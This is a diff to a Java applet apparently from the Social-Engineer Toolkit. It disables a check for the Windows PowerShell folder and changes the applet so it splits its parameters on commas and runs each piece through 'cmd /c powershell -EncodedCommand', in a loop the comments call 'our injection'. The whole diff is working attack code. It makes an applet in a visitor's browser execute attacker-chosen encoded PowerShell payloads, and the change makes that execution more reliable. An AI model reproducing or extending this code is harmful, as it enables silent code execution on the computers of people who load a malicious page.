@@ -121,30 +121,46 @@ public class Java extends Applet {
 	    // Here is where we define OS type, i.e. windows, linux, osx, etc.
             if ( osType < 1 ) // If we're running Windows 
             {
-                File folderExisting = new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0");
-                if (folderExisting.exists())
+		// Disabled the check, even if it doesn't exist, it will still execute, removes 
+		// inability to determine path variables
+
+                //File folderExisting = new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0");
+                // if (folderExisting.exists())
                 
-                {
+                // {
                         if (thirdParm.length() > 3) 
                         {
                         // this detection is for the new powershell vector, it will run a special command if the flag is turned on in SET
                         if (arch.contains("86") || arch.contains("64"))
+				
                                 {
                                 // this will be 64 bit
                                 if (fourthParm.length() > 3)
-                                {
-					f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + fourthParm);
-                                }
+				{
+					// iterate through Parm for our injection 
+					String strMain = fourthParm;
+					String[] arrSplit = strMain.split(",");
+					for (int i=0; i<arrSplit.length; i++)
+					{
+						f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + arrSplit[i]);
+	                                }
+				}
                                 }
                         else if (arch.contains("i"))
                                 {
                                 // this will be 32 bit
                                 if (thirdParm.length() > 3)
                                 {
-					f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + thirdParm);
+					// iterate through Parm for our injection
+                                        String strMain = thirdParm;
+                                        String[] arrSplit = strMain.split(",");
+                                        for (int i=0; i<arrSplit.length; i++)
+                                        {
+						f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + arrSplit[i]);
+					}
 
                                 }
-                                }
+                                // }
                       }
                    }
                 // if we aren't using the shellcodeexec attack
